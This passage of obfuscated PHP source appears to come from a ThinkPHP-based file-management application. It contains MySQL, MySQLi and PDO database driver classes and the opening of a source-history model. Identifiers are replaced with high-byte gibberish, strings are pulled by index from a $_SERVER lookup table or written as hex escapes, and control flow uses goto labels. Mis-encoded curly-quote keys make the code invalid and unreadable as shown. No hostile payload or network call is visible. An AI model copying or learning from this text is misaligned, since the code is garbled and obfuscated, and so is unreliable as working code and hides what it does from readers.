$ŒâãÚŸ) . $¨°µí¥ë[1020]; } array_walk($Î—ÜÖ•¢, array($this, $¨°µí¥ë[1021])); $»ıôÄŸ = $’ßº½èí ? $¨°µí¥ë[1022] : $¨°µí¥ë[1023]; $»ıôÄŸ = $¨°µí¥ë[1023]; $½ª²ƒö = $»ıôÄŸ . $¨°µí¥ë[1024] . $this->parseTable($¼¤ìŞÆŠ[$¨°µí¥ë[367]]) . $¨°µí¥ë[1018] . implode($¨°µí¥ë[50], $Î—ÜÖ•¢) . $¨°µí¥ë[1025] . implode($¨°µí¥ë[50], $ÔÓ»´àù); if ($’ßº½èí) { $Åğ‡ûò¨ = array(); foreach ($Î—ÜÖ•¢ as $‹Üí“¦Ô) { if ($‹Üí“¦Ô == $¨°µí¥ë[232] || $‹Üí“¦Ô == $¨°µí¥ë[1026]) { continue; } $Åğ‡ûò¨[] = $‹Üí“¦Ô . $¨°µí¥ë[1027] . $‹Üí“¦Ô . $¨°µí¥ë[1020]; } $½ª²ƒö .= $¨°µí¥ë[1028] . implode($¨°µí¥ë[50], $Åğ‡ûò¨); } return $this->execute($½ª²ƒö); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÆÌıÊ«‚ =& $_SERVER[‘ÆÜ‘œ]; $this->error = mysql_errno() . $ÆÌıÊ«‚[4] . mysql_error($this->_linkID); if ($ÆÌıÊ«‚[12] != $this->queryStr) { $this->error .= LNG($ÆÌıÊ«‚[48]) . $this->queryStr; } think_trace($this->error, $ÆÌıÊ«‚[12], $ÆÌıÊ«‚[49]); return $this->error; } public function escapeString($ÚûåıÜı) { if ($this->_linkID) { return mysql_real_escape_string($ÚûåıÜı, $this->_linkID); } else { return mysql_escape_string($ÚûåıÜı); } } public function parseKey(&$¨È­í±‘, $š¾ï„³³ = true) { $ÓíêÖ£» =& $_SERVER[‘ÆÜ‘œ]; if ($š¾ï„³³) { $¨È­í±‘ = $this->parseKeyCheck($¨È­í±‘); } if ($¨È­í±‘ != $ÓíêÖ£»[221] && !preg_match($ÓíêÖ£»[1029], $¨È­í±‘)) { $¨È­í±‘ = $ÓíêÖ£»[484] . trim($¨È­í±‘, $ÓíêÖ£»[484]) . $ÓíêÖ£»[484]; } return $¨È­í±‘; } } class DbMysqli extends Db { public function __construct($í‡âÓš¬ = '') { $ü…‘×ó¡ =& $_SERVER[‘ÆÜ‘œ]; if (!extension_loaded($ü…‘×ó¡[1030])) { think_exception(think_lang($ü…‘×ó¡[14]) . $ü…‘×ó¡[1031]); } if (!empty($í‡âÓš¬)) { $this->config = $í‡âÓš¬; if (empty($this->config[$ü…‘×ó¡[17]])) { $this->config[$ü…‘×ó¡[17]] = $ü…‘×ó¡[12]; } } } public function connect($€Ø¾®ıİ = '', $¬²‘áôÃ = 0) { $ÇŞ•ñòì =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->linkID[$¬²‘áôÃ])) { if (empty($€Ø¾®ıİ)) { $€Ø¾®ıİ = $this->config; } $this->linkID[$¬²‘áôÃ] = new mysqli($€Ø¾®ıİ[$ÇŞ•ñòì[1001]], $€Ø¾®ıİ[$ÇŞ•ñòì[1003]], $€Ø¾®ıİ[$ÇŞ•ñòì[1004]], $€Ø¾®ıİ[$ÇŞ•ñòì[21]], $€Ø¾®ıİ[$ÇŞ•ñòì[1002]] ? intval($€Ø¾®ıİ[$ÇŞ•ñòì[1002]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ı«³¡ƒ = $this->linkID[$¬²‘áôÃ]->server_version; $this->linkID[$¬²‘áôÃ]->query($ÇŞ•ñòì[1005] . think_config($ÇŞ•ñòì[1006]) . $ÇŞ•ñòì[58]); if ($ı«³¡ƒ > $ÇŞ•ñòì[1007]) { $this->linkID[$¬²‘áôÃ]->query($ÇŞ•ñòì[1008]); } $this->connected = !0; if (1 != think_config($ÇŞ•ñòì[22])) { unset($this->config); } } return $this->linkID[$¬²‘áôÃ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($«ÄÊƒÆÊ) { $»òŒ¼…÷ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«ÄÊƒÆÊ; if ($this->queryID) { $this->free(); } think_action_status($»òŒ¼…÷[23], 1); think_status($»òŒ¼…÷[24]); $this->queryID = $this->_linkID->query($«ÄÊƒÆÊ); if ($this->_linkID->more_results()) { while (($ÀóÕÅß = $this->_linkID->next_result()) != NULL) { $ÀóÕÅß->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¯ÅŸé›ï) { $¾Âú®ñ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¯ÅŸé›ï; if ($this->queryID) { $this->free(); } think_action_status($¾Âú®ñ[25], 1); think_status($¾Âú®ñ[24]); $Ãº²”à™ = $this->_linkID->query($¯ÅŸé›ï); $this->debug(); if (!1 === $Ãº²”à™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÎÙú¹Ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÎÙú¹Ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $´õÜòƒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$´õÜòƒ) { $this->error(); return !1; } } return !0; } private function getAll() { $¯Ûèñæ™ = array(); if ($this->numRows > 0) { for ($¡ˆ¤ÒîÎ = 0; $¡ˆ¤ÒîÎ < $this->numRows; $¡ˆ¤ÒîÎ++) { $¯Ûèñæ™[$¡ˆ¤ÒîÎ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¯Ûèñæ™; } public function getFields($‰ãèêª«) { $‚¹”¬¡ =& $_SERVER[‘ÆÜ‘œ]; $øíîªøØ = $this->query($‚¹”¬¡[1012] . $this->parseKey($‰ãèêª«)); $ïÉì÷¤ï = array(); if ($øíîªøØ) { foreach ($øíîªøØ as $¸Ó€ İÈ => $â‘åğÊ”) { $ïÉì÷¤ï[$â‘åğÊ”[$‚¹”¬¡[31]]] = array($‚¹”¬¡[32] => $â‘åğÊ”[$‚¹”¬¡[31]], $‚¹”¬¡[33] => $â‘åğÊ”[$‚¹”¬¡[34]], $‚¹”¬¡[35] => (bool) ($â‘åğÊ”[$‚¹”¬¡[36]] === $‚¹”¬¡[12]), $‚¹”¬¡[37] => $â‘åğÊ”[$‚¹”¬¡[38]], $‚¹”¬¡[39] => strtolower($â‘åğÊ”[$‚¹”¬¡[40]]) == $‚¹”¬¡[41], $‚¹”¬¡[42] => strtolower($â‘åğÊ”[$‚¹”¬¡[43]]) == $‚¹”¬¡[44]); } } return $ïÉì÷¤ï; } public function getTables($ÓÚ€Ù´¥ = '') { $°ú‰»ş« =& $_SERVER[‘ÆÜ‘œ]; $²·ß Ïı = !empty($ÓÚ€Ù´¥) ? $°ú‰»ş«[1014] . $ÓÚ€Ù´¥ . $°ú‰»ş«[1015] : $°ú‰»ş«[1016]; $ã’¦É¾â = $this->query($²·ß Ïı); $áİİßÂî = array(); if ($ã’¦É¾â) { foreach ($ã’¦É¾â as $Ï¸Ã–¸Ì => $µ€“áà) { $áİİßÂî[$Ï¸Ã–¸Ì] = current($µ€“áà); } } return $áİİßÂî; } public function replace($êŠö‚, $åøâğïÙ = array()) { $×à¥¦ª® =& $_SERVER[‘ÆÜ‘œ]; foreach ($êŠö‚ as $çÆ¹¼’ƒ => $àã¦“Œ) { $µÌ¿¬Ğ = $this->parseValue($àã¦“Œ); if (is_scalar($µÌ¿¬Ğ)) { $È‰Ãéß[] = $µÌ¿¬Ğ; $Â¥éä–Ú[] = $this->parseKey($çÆ¹¼’ƒ); } } $îŞ‹’Û° = $×à¥¦ª®[1017] . $this->parseTable($åøâğïÙ[$×à¥¦ª®[367]]) . $×à¥¦ª®[1018] . implode($×à¥¦ª®[50], $Â¥éä–Ú) . $×à¥¦ª®[1019] . implode($×à¥¦ª®[50], $È‰Ãéß) . $×à¥¦ª®[1020]; return $this->execute($îŞ‹’Û°); } public function insertAll($¯ĞÒÃ‰ê, $ßŒ¼²¼¾ = array(), $ØÌÚ¸Ğ = false) { $Ü…´•‚½ =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($¯ĞÒÃ‰ê[0])) { return !1; } $ôÜ™ˆì = array_keys($¯ĞÒÃ‰ê[0]); $òş–ù¦ˆ = array(); foreach ($¯ĞÒÃ‰ê as $²ÒÃ´ûê) { $®¥¾‹®Ê = array(); foreach ($²ÒÃ´ûê as $Ğ˜«ÀıÒ => $ã¹Öà©) { $ã¹Öà© = $this->parseValue($ã¹Öà©); if (is_scalar($ã¹Öà©)) { $®¥¾‹®Ê[] = $ã¹Öà©; } } $òş–ù¦ˆ[] = $Ü…´•‚½[347] . implode($Ü…´•‚½[50], $®¥¾‹®Ê) . $Ü…´•‚½[1020]; } array_walk($ôÜ™ˆì, array($this, $Ü…´•‚½[1021])); $Ç›ı¶¢Â = $ØÌÚ¸Ğ ? $Ü…´•‚½[1022] : $Ü…´•‚½[1023]; $Ç›ı¶¢Â = $Ü…´•‚½[1023]; $†¼¥şÖÚ = $Ç›ı¶¢Â . $Ü…´•‚½[1024] . $this->parseTable($ßŒ¼²¼¾[$Ü…´•‚½[367]]) . $Ü…´•‚½[1018] . implode($Ü…´•‚½[50], $ôÜ™ˆì) . $Ü…´•‚½[1025] . implode($Ü…´•‚½[50], $òş–ù¦ˆ); if ($ØÌÚ¸Ğ) { $ûÇª²Ã§ = array(); foreach ($ôÜ™ˆì as $Ğ˜«ÀıÒ) { if ($Ğ˜«ÀıÒ == $Ü…´•‚½[232] || $Ğ˜«ÀıÒ == $Ü…´•‚½[1026]) { continue; } $ûÇª²Ã§[] = $Ğ˜«ÀıÒ . $Ü…´•‚½[1027] . $Ğ˜«ÀıÒ . $Ü…´•‚½[1020]; } $†¼¥şÖÚ .= $Ü…´•‚½[1028] . implode($Ü…´•‚½[50], $ûÇª²Ã§); } return $this->execute($†¼¥şÖÚ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ì„€ê—“ =& $_SERVER[‘ÆÜ‘œ]; $this->error = $this->_linkID->errno . $ì„€ê—“[4] . $this->_linkID->error; if ($ì„€ê—“[12] != $this->queryStr) { $this->error .= LNG($ì„€ê—“[48]) . $this->queryStr; } think_trace($this->error, $ì„€ê—“[12], $ì„€ê—“[49]); return $this->error; } public function escapeString($ìÛşæƒ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ìÛşæƒ); } else { return addslashes($ìÛşæƒ); } } public function parseKey(&$¿‡ ×¹, $—û¼ÄÁÖ = true) { $Í”ã›ñ =& $_SERVER[‘ÆÜ‘œ]; if ($—û¼ÄÁÖ) { $¿‡ ×¹ = $this->parseKeyCheck($¿‡ ×¹); } if ($¿‡ ×¹ != $Í”ã›ñ[221] && !preg_match($Í”ã›ñ[1029], $¿‡ ×¹)) { $¿‡ ×¹ = $Í”ã›ñ[484] . trim($¿‡ ×¹, $Í”ã›ñ[484]) . $Í”ã›ñ[484]; } return $¿‡ ×¹; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($üÌøÜ§¤ = '') { $æôÎôÈö =& $_SERVER[‘ÆÜ‘œ]; if (!class_exists($æôÎôÈö[1032])) { think_exception(think_lang($æôÎôÈö[14]) . $æôÎôÈö[1033]); } if (!empty($üÌøÜ§¤)) { $this->config = $üÌøÜ§¤; if (empty($this->config[$æôÎôÈö[17]])) { $this->config[$æôÎôÈö[17]] = array(); } } } public function connect($ÖàŒıîæ = '', $˜§³ñ×” = 0) { $÷ÆÅ¾€› =& $_SERVER[‘ÆÜ‘œ]; if (!isset($this->linkID[$˜§³ñ×”])) { if (empty($ÖàŒıîæ)) { $ÖàŒıîæ = $this->config; } $ºÅ¿ª†š = !empty($ÖàŒıîæ[$÷ÆÅ¾€›[17]][$÷ÆÅ¾€›[18]]) ? $ÖàŒıîæ[$÷ÆÅ¾€›[17]][$÷ÆÅ¾€›[18]] : $this->pconnect; if ($ºÅ¿ª†š) { $ÖàŒıîæ[$÷ÆÅ¾€›[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$˜§³ñ×”] = new PDO($ÖàŒıîæ[$÷ÆÅ¾€›[1034]], $ÖàŒıîæ[$÷ÆÅ¾€›[1003]], $ÖàŒıîæ[$÷ÆÅ¾€›[1004]], $ÖàŒıîæ[$÷ÆÅ¾€›[17]]); } catch (PDOException $¦€º«ˆ¿) { think_exception($¦€º«ˆ¿->getMessage()); } $this->dbType = $this->_getDsnType($ÖàŒıîæ[$÷ÆÅ¾€›[1034]]); if (in_array($this->dbType, array($÷ÆÅ¾€›[1035], $÷ÆÅ¾€›[1036], $÷ÆÅ¾€›[1037], $÷ÆÅ¾€›[1038]))) { think_exception($÷ÆÅ¾€›[1039] . $this->dbType . $÷ÆÅ¾€›[1040] . $this->dbType . $÷ÆÅ¾€›[1041]); } if (!$this->linkID[$˜§³ñ×”]) { think_exception($÷ÆÅ¾€›[1042]); } try { $this->linkID[$˜§³ñ×”]->exec($÷ÆÅ¾€›[1043] . think_config($÷ÆÅ¾€›[1006])); } catch (Exception $¦€º«ˆ¿) { } $this->connected = !0; if (1 != think_config($÷ÆÅ¾€›[22])) { unset($this->config); } } return $this->linkID[$˜§³ñ×”]; } public function free() { $this->PDOStatement = null; } public function query($‹–çªİ…, $îŠ¾Íß = array()) { $Áµ¯òíÓ =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‹–çªİ…; if (!empty($îŠ¾Íß)) { $this->queryStr .= $Áµ¯òíÓ[1044] . print_r($îŠ¾Íß, !0) . $Áµ¯òíÓ[1045]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Áµ¯òíÓ[23], 1); think_status($Áµ¯òíÓ[24]); $this->PDOStatement = $this->_linkID->prepare($‹–çªİ…); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $£ Ã›½ = $this->PDOStatement->execute($îŠ¾Íß); $this->debug(); if (!1 === $£ Ã›½) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¼Èñ‹˜Ñ, $˜™î´ôÊ = array()) { $£Ú½õ´· =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¼Èñ‹˜Ñ; if (!empty($˜™î´ôÊ)) { $this->queryStr .= $£Ú½õ´·[1044] . print_r($˜™î´ôÊ, !0) . $£Ú½õ´·[1045]; } $Êø©‹ñÀ = !1; if ($this->dbType == $£Ú½õ´·[1038]) { if (preg_match($£Ú½õ´·[1046], $this->queryStr, $ˆÔÄ„‘›)) { $this->table = think_config($£Ú½õ´·[1047]) . str_ireplace(think_config($£Ú½õ´·[1048]), $£Ú½õ´·[472], $ˆÔÄ„‘›[2]); $Êø©‹ñÀ = (bool) $this->query($£Ú½õ´·[1049] . strtoupper($this->table) . $£Ú½õ´·[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($£Ú½õ´·[25], 1); think_status($£Ú½õ´·[24]); $this->PDOStatement = $this->_linkID->prepare($¼Èñ‹˜Ñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‚¶á·¥À = $this->PDOStatement->execute($˜™î´ôÊ); $this->debug(); if (!1 === $‚¶á·¥À) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Êø©‹ñÀ || preg_match($£Ú½õ´·[1050], $¼Èñ‹˜Ñ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ğ›ÕÅ‘ª = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ğ›ÕÅ‘ª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $³²–ÉŠ€ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$³²–ÉŠ€) { $this->error(); return !1; } } return !0; } private function getAll() { $Øàœ‘ÁË = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Øàœ‘ÁË); return $Øàœ‘ÁË; } public function getFields($÷Ú£÷×ï) { $¢ìæ¹À =& $_SERVER[‘ÆÜ‘œ]; $this->initConnect(!0); if (think_config($¢ìæ¹À[1051])) { $€Ç’œŠ = str_replace($¢ìæ¹À[1052], $÷Ú£÷×ï, think_config($¢ìæ¹À[1051])); } else { switch ($this->dbType) { case $¢ìæ¹À[1035]: case $¢ìæ¹À[1053]: $€Ç’œŠ = "\x53\105\x4c\105\x43\124\40\40\x20\x63\x6f\154\165\x6d\x6e\x5f\156\x61\155\145\40\x61\x73\40\47\x4e\x61\x6d\x65\x27\54\40\40\40\x64\x61\x74\x61\x5f\x74\171\x70\145\x20\x61\x73\x20\x27\x54\x79\x70\x65\x27\54\x20\40\40\x63\x6f\x6c\x75\155\156\x5f\144\x65\146\x61\165\154\164\x20\141\163\40\x27\104\x65\x66\141\165\x6c\164\47\x2c\x20\x20\40\x69\x73\137\x6e\x75\x6c\x6c\x61\142\x6c\x65\40\x61\163\x20\x27\x4e\x75\x6c\x6c\x27\12\11\x9\x46\x52\x4f\115\x9\151\x6e\x66\157\x72\155\x61\164\x69\157\x6e\137\163\x63\150\x65\155\141\x2e\164\x61\x62\x6c\x65\x73\40\x41\123\40\x74\xa\x9\11\112\117\x49\116\11\x69\156\x66\x6f\x72\155\141\x74\x69\x6f\156\137\163\143\x68\145\x6d\141\x2e\143\x6f\x6c\x75\155\x6e\x73\40\101\123\x20\x63\xa\x9\11\117\x4e\40\40\x74\56\164\141\x62\x6c\145\x5f\x63\141\x74\141\x6c\157\x67\x20\75\40\x63\56\x74\141\x62\x6c\145\x5f\143\141\x74\x61\x6c\x6f\147\xa\11\11\101\x4e\104\40\x74\x2e\x74\x61\142\154\x65\137\163\x63\x68\x65\155\x61\40\75\x20\x63\56\x74\141\142\154\x65\137\x73\x63\150\x65\155\x61\12\x9\x9\x41\116\104\40\164\x2e\164\141\x62\x6c\x65\x5f\156\x61\155\x65\40\x3d\40\143\56\164\x61\x62\154\x65\x5f\x6e\x61\155\x65\12\11\11\x57\x48\105\122\105\x20\40\x20\x74\56\164\141\142\x6c\x65\137\x6e\x61\155\x65\x20\75\40\x27{$÷Ú£÷×ï}\x27"; break; case $¢ìæ¹À[1054]: $€Ç’œŠ = $¢ìæ¹À[1055] . $÷Ú£÷×ï . $¢ìæ¹À[1056]; break; case $¢ìæ¹À[1036]: case $¢ìæ¹À[1038]: $€Ç’œŠ = $¢ìæ¹À[1057] . $¢ìæ¹À[1058] . $¢ìæ¹À[1059] . strtoupper($÷Ú£÷×ï) . $¢ìæ¹À[1060] . strtoupper($÷Ú£÷×ï) . $¢ìæ¹À[1061]; break; case $¢ìæ¹À[1062]: $€Ç’œŠ = $¢ìæ¹À[1063] . $÷Ú£÷×ï . $¢ìæ¹À[1064]; break; case $¢ìæ¹À[1037]: break; case $¢ìæ¹À[1065]: default: $€Ç’œŠ = $¢ìæ¹À[1066] . ($this->dbType == $¢ìæ¹À[1065] ? "\140{$÷Ú£÷×ï}\140" : $÷Ú£÷×ï); } } $°õæ÷‰ = $this->query($€Ç’œŠ); $êÇªÆÎ¼ = array(); if ($°õæ÷‰) { foreach ($°õæ÷‰ as $½£´Ôù => $ˆÏ˜¼¾¯) { $ˆÏ˜¼¾¯ = array_change_key_case($ˆÏ˜¼¾¯); $ˆÏ˜¼¾¯[$¢ìæ¹À[32]] = isset($ˆÏ˜¼¾¯[$¢ìæ¹À[32]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[32]] : $¢ìæ¹À[472]; $ˆÏ˜¼¾¯[$¢ìæ¹À[33]] = isset($ˆÏ˜¼¾¯[$¢ìæ¹À[33]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[33]] : $¢ìæ¹À[472]; $ŞÑ÷üÙÚ = isset($ˆÏ˜¼¾¯[$¢ìæ¹À[361]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[361]] : $ˆÏ˜¼¾¯[$¢ìæ¹À[32]]; $êÇªÆÎ¼[$ŞÑ÷üÙÚ] = array($¢ìæ¹À[32] => $ŞÑ÷üÙÚ, $¢ìæ¹À[33] => $ˆÏ˜¼¾¯[$¢ìæ¹À[33]], $¢ìæ¹À[35] => (bool) (isset($ˆÏ˜¼¾¯[$¢ìæ¹À[104]]) && $ˆÏ˜¼¾¯[$¢ìæ¹À[104]] === $¢ìæ¹À[12] || isset($ˆÏ˜¼¾¯[$¢ìæ¹À[35]]) && $ˆÏ˜¼¾¯[$¢ìæ¹À[35]] === $¢ìæ¹À[12]), $¢ìæ¹À[37] => isset($ˆÏ˜¼¾¯[$¢ìæ¹À[37]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[37]] : (isset($ˆÏ˜¼¾¯[$¢ìæ¹À[56]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[56]] : $¢ìæ¹À[472]), $¢ìæ¹À[39] => isset($ˆÏ˜¼¾¯[$¢ìæ¹À[95]]) ? strtolower($ˆÏ˜¼¾¯[$¢ìæ¹À[95]]) == $¢ìæ¹À[41] : (isset($ˆÏ˜¼¾¯[$¢ìæ¹À[57]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[57]] : !1), $¢ìæ¹À[42] => isset($ˆÏ˜¼¾¯[$¢ìæ¹À[1067]]) ? strtolower($ˆÏ˜¼¾¯[$¢ìæ¹À[1067]]) == $¢ìæ¹À[44] : (isset($ˆÏ˜¼¾¯[$¢ìæ¹À[95]]) ? $ˆÏ˜¼¾¯[$¢ìæ¹À[95]] : !1)); } } return $êÇªÆÎ¼; } public function getTables($·ì£öÄƒ = '') { $‹Û´ñÛ =& $_SERVER[‘ÆÜ‘œ]; if (think_config($‹Û´ñÛ[1068])) { $ùï®©¯ñ = str_replace($‹Û´ñÛ[1069], $·ì£öÄƒ, think_config($‹Û´ñÛ[1068])); } else { switch ($this->dbType) { case $‹Û´ñÛ[1036]: case $‹Û´ñÛ[1038]: $ùï®©¯ñ = $‹Û´ñÛ[1070]; break; case $‹Û´ñÛ[1035]: case $‹Û´ñÛ[1053]: $ùï®©¯ñ = $‹Û´ñÛ[1071]; break; case $‹Û´ñÛ[1062]: $ùï®©¯ñ = $‹Û´ñÛ[1072]; break; case $‹Û´ñÛ[1037]: think_exception(think_lang($‹Û´ñÛ[1073]) . $‹Û´ñÛ[1074]); break; case $‹Û´ñÛ[1054]: $ùï®©¯ñ = $‹Û´ñÛ[45] . $‹Û´ñÛ[46] . $‹Û´ñÛ[47]; break; case $‹Û´ñÛ[1065]: default: if (!empty($·ì£öÄƒ)) { $ùï®©¯ñ = $‹Û´ñÛ[1014] . $·ì£öÄƒ . $‹Û´ñÛ[1015]; } else { $ùï®©¯ñ = $‹Û´ñÛ[1016]; } } } $ˆëÄÔ — = $this->query($ùï®©¯ñ); $÷Ó«¹İÃ = array(); foreach ($ˆëÄÔ — as $²¹ÂŞô“ => $ÊâÊ»¬æ) { $÷Ó«¹İÃ[$²¹ÂŞô“] = current($ÊâÊ»¬æ); } return $÷Ó«¹İÃ; } protected function parseLimit($ù’ÒÉ´‘) { $“ÍÓ¹’ê =& $_SERVER[‘ÆÜ‘œ]; $øšÙ§ÜÂ = $“ÍÓ¹’ê[12]; if (!empty($ù’ÒÉ´‘)) { switch ($this->dbType) { case $“ÍÓ¹’ê[1062]: case $“ÍÓ¹’ê[1054]: $ù’ÒÉ´‘ = explode($“ÍÓ¹’ê[50], $ù’ÒÉ´‘); if (count($ù’ÒÉ´‘) > 1) { $øšÙ§ÜÂ .= $“ÍÓ¹’ê[51] . $ù’ÒÉ´‘[1] . $“ÍÓ¹’ê[52] . $ù’ÒÉ´‘[0] . $“ÍÓ¹’ê[53]; } else { $øšÙ§ÜÂ .= $“ÍÓ¹’ê[51] . $ù’ÒÉ´‘[0] . $“ÍÓ¹’ê[53]; } break; case $“ÍÓ¹’ê[1035]: case $“ÍÓ¹’ê[1053]: break; case $“ÍÓ¹’ê[1037]: break; case $“ÍÓ¹’ê[1036]: case $“ÍÓ¹’ê[1038]: break; case $“ÍÓ¹’ê[1065]: default: $øšÙ§ÜÂ .= $“ÍÓ¹’ê[51] . $ù’ÒÉ´‘ . $“ÍÓ¹’ê[53]; } } return $øšÙ§ÜÂ; } public function parseKey(&$ãÚü‘î», $¤ƒ¤ÃñÊ = true) { $§ Œ¬Úü =& $_SERVER[‘ÆÜ‘œ]; if ($¤ƒ¤ÃñÊ) { $ãÚü‘î» = $this->parseKeyCheck($ãÚü‘î»); } if ($this->dbType == $§ Œ¬Úü[1065]) { if ($ãÚü‘î» != $§ Œ¬Úü[221] && !preg_match($§ Œ¬Úü[1029], $ãÚü‘î»)) { $ãÚü‘î» = $§ Œ¬Úü[484] . trim($ãÚü‘î», $§ Œ¬Úü[484]) . $§ Œ¬Úü[484]; } return $ãÚü‘î»; } else { return parent::parseKey($ãÚü‘î», $¤ƒ¤ÃñÊ); } } public function close() { $this->_linkID = null; } public function error() { $œœô‘¬ =& $_SERVER[‘ÆÜ‘œ]; if ($this->PDOStatement) { $µÊŸö»— = $this->PDOStatement->errorInfo(); $this->error = $µÊŸö»—[1] . $œœô‘¬[4] . $µÊŸö»—[2]; } else { $this->error = $œœô‘¬[12]; } if ($œœô‘¬[12] != $this->queryStr) { $this->error .= LNG($œœô‘¬[48]) . $this->queryStr; } think_trace($this->error, $œœô‘¬[12], $œœô‘¬[49]); return $this->error; } public function escapeString($œ¼”ÀÚ²) { $¿Ò¥Å»ì =& $_SERVER[‘ÆÜ‘œ]; switch ($this->dbType) { case $¿Ò¥Å»ì[1062]: case $¿Ò¥Å»ì[1035]: case $¿Ò¥Å»ì[1053]: case $¿Ò¥Å»ì[1065]: return addslashes($œ¼”ÀÚ²); case $¿Ò¥Å»ì[1037]: case $¿Ò¥Å»ì[1054]: case $¿Ò¥Å»ì[1036]: case $¿Ò¥Å»ì[1038]: return str_ireplace($¿Ò¥Å»ì[58], $¿Ò¥Å»ì[59], $œ¼”ÀÚ²); } } protected function parseValue($Œ½½ëµ) { $ËÇˆªŒ‘ =& $_SERVER[‘ÆÜ‘œ]; if (is_string($Œ½½ëµ)) { $š÷ó‰í“ = strpos($Œ½½ëµ, $ËÇˆªŒ‘[4]) === 0 && in_array($Œ½½ëµ, array_keys($this->bind)); $Œ½½ëµ = $š÷ó‰í“ ? $this->escapeString($Œ½½ëµ) : $ËÇˆªŒ‘[1075] . $this->escapeString($Œ½½ëµ) . $ËÇˆªŒ‘[1075]; } elseif (isset($Œ½½ëµ[0]) && is_string($Œ½½ëµ[0]) && strtolower($Œ½½ëµ[0]) == $ËÇˆªŒ‘[382]) { $Œ½½ëµ = $this->escapeString($Œ½½ëµ[1]); } elseif (is_array($Œ½½ëµ)) { $Œ½½ëµ = array_map(array($this, $ËÇˆªŒ‘[1076]), $Œ½½ëµ); } elseif (is_bool($Œ½½ëµ)) { $Œ½½ëµ = $Œ½½ëµ ? $ËÇˆªŒ‘[91] : $ËÇˆªŒ‘[229]; } elseif (is_null($Œ½½ëµ)) { $Œ½½ëµ = $ËÇˆªŒ‘[104]; } return $Œ½½ëµ; } public function getLastInsertId() { $ú›©®¬ =& $_SERVER[‘ÆÜ‘œ]; switch ($this->dbType) { case $ú›©®¬[1062]: case $ú›©®¬[1054]: case $ú›©®¬[1035]: case $ú›©®¬[1053]: case $ú›©®¬[1037]: case $ú›©®¬[1065]: return $this->_linkID->lastInsertId(); case $ú›©®¬[1036]: case $ú›©®¬[1038]: $£ÔœÌêÁ = $this->table; $¹ñŸ·È = $this->query("\123\x45\114\105\103\124\x20{$£ÔœÌêÁ}\56\143\165\x72\x72\x76\x61\x6c\40\143\x75\x72\162\166\141\x6c\x20\x46\x52\x4f\x4d\x20\x64\165\x61\154"); return $¹ñŸ·È ? $¹ñŸ·È[0][$ú›©®¬[1077]] : 0; } } } goto C„“ÖÁØØ…; b×´Ëó–à×: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\x63\145\137\x68\151\163\164\157\162\x79"; public function historyCount($”ÑÇÎ¤Ò) { $ÆÂÉ½Š÷ =& $_SERVER[‘ÆÜ‘œ]; if (!$”ÑÇÎ¤Ò) { return array(); } if (is_string($”ÑÇÎ¤Ò) || is_int($”ÑÇÎ¤Ò)) { $”ÑÇÎ¤Ò = array($”ÑÇÎ¤Ò); } $‚ı±İ©Ï = array($ÆÂÉ½Š÷[192], $ÆÂÉ½Š÷[2387] => $ÆÂÉ½Š÷[593]); $Ê“¥È´ = array($ÆÂÉ½Š÷[192] => array($ÆÂÉ½Š÷[7], $”ÑÇÎ¤Ò)); $Õ¹´”çä = $this->field($‚ı±İ©Ï)->where($Ê“¥È´)->group($ÆÂÉ½Š÷[192])->select(); return array_to_keyvalue($Õ¹´”çä, $ÆÂÉ½Š÷[192], $ÆÂÉ½Š÷[593]); } public function addHistory($ö­‹¿ŒÊ, $œê¶Ö«¬ = '') { $üÚú´‡ =& 